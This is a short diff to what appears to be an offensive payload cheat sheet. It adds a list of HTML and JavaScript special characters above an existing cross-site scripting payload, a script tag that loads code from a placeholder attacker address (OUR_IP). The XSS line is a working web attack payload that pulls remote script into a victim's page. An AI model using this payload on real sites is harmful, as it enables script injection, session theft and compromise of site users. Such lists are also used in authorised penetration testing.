@@ -1,5 +1,11 @@
 # Payloads
 
+### references: special characters for HTML and javascript
+```
+< > ' " { } ;
+```
+---
+
 ### script: XSS with script tag 
 ```html
 <script src=http://OUR_IP></script>
